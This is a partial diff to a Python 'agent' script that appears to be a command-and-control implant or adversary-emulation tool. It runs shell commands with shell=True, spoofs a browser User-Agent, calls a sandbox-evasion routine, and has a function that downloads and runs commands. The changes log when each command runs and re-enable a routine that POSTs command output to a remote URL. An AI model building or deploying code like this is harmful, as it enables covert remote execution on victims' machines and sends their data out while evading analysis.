@@ -10,12 +10,13 @@ http = urllib3.PoolManager()
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                          ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
 TIMEOUT = 15
+executed = []
 
 
 def execute_command(command_issued):
     cmd = subprocess.Popen(command_issued, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
-
+    executed.append(datetime.datetime.now())
     try:
         success, error = cmd.communicate(timeout=TIMEOUT)
     except subprocess.TimeoutExpired:
@@ -116,7 +117,7 @@ def send_output():
     # executing that technique
     for i, res in enumerate(agent_tech):
         # try:
-        req = http.request('POST', url, fields={'id': 5, agent_tech[i]: std_out[i]}, headers=headers)
+        req = http.request('POST', url, fields={'id': 5, 'tech': agent_tech[i], 'output': std_out[i]}, headers=headers)
         print('Response code: ' + str(req.status))
         # time.sleep(4)
         # except IndexError:
@@ -161,11 +162,11 @@ if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
 
-    techs = get_techniques()
-    print(techs)
-    results = download_and_run_commands()
-    print(results)
+    # techs = get_techniques()
+    # print(techs)
+    # results = download_and_run_commands()
+    # print(results)
 
-    # send_output()
+    send_output()
 
 
